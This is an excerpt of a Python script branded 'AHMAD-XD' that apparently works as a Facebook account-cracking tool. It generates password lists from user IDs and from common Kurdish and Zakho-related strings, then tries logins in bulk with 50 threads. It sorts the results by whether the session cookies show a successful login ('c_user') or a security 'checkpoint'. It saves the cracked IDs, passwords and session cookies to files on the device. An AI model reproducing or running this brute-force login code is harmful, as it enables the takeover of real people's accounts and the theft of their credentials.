...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[AHMAD-XD')
...
def banner():
	print(f"""\033[1;32m
      ...
      .o.       ooo        ooooo oooooooooo.   
     .888.      `88.       .888' `888'   `Y8b  
    .8"888.      888b     d'888   888      888 
   .8' `888.     8 Y88. .P  888   888      888 
  .88ooo8888.    8  `888'   888   888      888 
 .8'     `888.   8    Y     888   888     d88' 
o88o     o8888o o8o        o888o o888bood8P'   

\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : AHMAD KING
\033[1;32m  GITHUB    : AHMAD-FB
\033[1;32m  FACEBOOK  : MR_4HMED
...
def menu():
	...
	_ALAMIN_(f'[\033[1;92m\033[1;34m2\033[1;92m] DUMP FILE')
	_ALAMIN_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] RANDOM CLONE')
	_ALAMIN_(f'\033[1;92m[\033[1;92m\033[1;34m4\033[1;92m] EMAIL CLONE')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append('zaxo321')
					pwv.append('zaxo1122')
					pwv.append('zaxo112233')
					pwv.append('zaxo11223344')
					pwv.append('zaxo1221')
					pwv.append('zaxo123321')
					pwv.append('zaxo12344321')
					pwv.append('zaxo1234554321')
					pwv.append('123zaxo')
					pwv.append('1234zaxo')
					pwv.append('12345zaxo')
					pwv.append('kurdkurd')
					pwv.append('kurd12')
					pwv.append('kurd123')
					pwv.append('kurd1234')
					pwv.append('kurd12345')
					pwv.append('zaxokurd')
					pwv.append('kurdish123')
					pwv.append('kurdish12345')
					pwv.append(frs+'zaxo')
					pwv.append(frs+'zaxoy')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [AMD] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mAMD-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mAMD-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/AMD-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    print('\033[1;96m[KRD CODE] \033[1;92m> \033[1;92m 750 - 751')
    ...
    with ThreadPool(max_workers=50) as ALAMIN:
        ...
        print(f"\033[1;92m---------------------------------------------------------")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3], 'zaxozaxo', 'zaxozaxo123', 'zaxozaxo12', 'zaxo123', 'zaxo1234', 'zaxo12345', 'zaxo1122', 'zaxo112233', 'zaxo123321', 'zaxo12344321', 'zaxo123454321', 'kurd123', 'kurd1234', 'kurd12345', 'ahmadzaxoy', 'ahmadzaxo123', 'omed123', 'omed1234', 'omed12345', 'zaxokurd', 'zakho123', 'zakho1234', 'zakho12345', 'zakho123321','zakho1122','zakho123456789','zakho1122334455','zakhokurd']
            uid = code+love
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mAMD-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
              ...
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/AMD-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[AMD-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/AMD-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
            elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
